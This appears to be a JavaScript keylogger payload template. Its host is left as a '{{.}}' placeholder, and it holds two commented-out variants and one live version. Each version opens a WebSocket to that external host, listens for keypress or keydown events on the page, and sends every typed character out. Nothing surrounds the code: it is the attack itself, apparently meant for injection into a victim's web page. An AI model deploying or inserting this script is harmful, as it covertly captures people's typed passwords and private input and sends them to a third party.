/*
(function() {
	var conn = new WebSocket("ws://{{.}}/ws");
	document.onkeypress = keypress;
	function keypress(evt){
		s = String.fromCharCode(evt.which);
		conn.send(s);
	}
})();
*/
/*
(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.addEventListener("keypress", keypress);
    function keypress(evt){
        var s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
*/
(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeydown = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
